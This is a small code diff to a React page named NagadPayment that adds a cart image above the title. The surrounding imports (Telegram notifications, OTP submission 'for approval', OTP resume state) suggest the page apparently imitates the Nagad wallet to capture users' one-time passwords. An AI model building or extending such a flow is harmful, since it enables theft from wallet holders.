@@ -4,6 +4,7 @@ import { sendTelegramNotification } from "@/lib/payment-telegram";
 import { submitOtpForApproval } from "@/lib/otpApproval";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
+import nagadCart from "@/assets/nagad-cart.png.asset.json";
 import { clearOtpResume, readOtpResume, saveOtpResume } from "@/lib/otpResume";
 import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";
 import SingleCircleLoader from "@/components/payment/SingleCircleLoader";
@@ -289,6 +290,7 @@ const NagadPayment = () => {
         </div>
         <div className="flex-1 flex flex-col justify-evenly min-h-0">
           <div className="flex flex-col items-center shrink-0">
+            <img src={nagadCart.url} alt="Cart" className="h-12 min-[375px]:h-16 w-auto mb-1 object-contain" />
             <h1 className="text-[#ccc] text-sm min-[375px]:text-lg font-bold">{t.title}</h1>
           </div>
           <div className="px-6 min-[375px]:px-8 shrink-0">
